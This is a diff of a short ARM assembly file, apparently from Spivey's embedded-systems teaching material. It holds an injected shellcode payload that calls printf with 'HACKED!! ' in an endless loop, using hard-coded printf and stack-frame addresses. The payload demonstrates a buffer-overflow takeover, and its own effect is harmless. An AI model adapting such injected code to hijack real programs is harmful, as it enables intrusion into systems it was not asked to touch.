@@ -1,19 +1,19 @@
-@@@ @DIR x1500-hack@/attack.s
+@@@ hack/attack.s
 @@@ Copyright (c) J. M. Spivey 2020
         
         .syntax unified
 
-        .equ printf, 0x000004c0 @ Address of printf
+        .equ printf, 0x0000049c @ Address of printf
         .equ frame, 0x20003fb0  @ Captured stack pointer value in init
 
         .text
 attack:
         sub sp, #56             @  0: Reserve stack space again
-1:
+again:
         adr r0, message         @  2: Address of our message
         ldr r1, =printf+1       @  4: Absolute address for call
         blx r1                  @  6: Call printf
-        b 1b                    @  8: Spin forever
+        b again                 @  8: Spin forever
         .pool                   @ 12: constant pool
 message:
         .asciz "HACKED!! "      @ 16: string -- 10 bytes
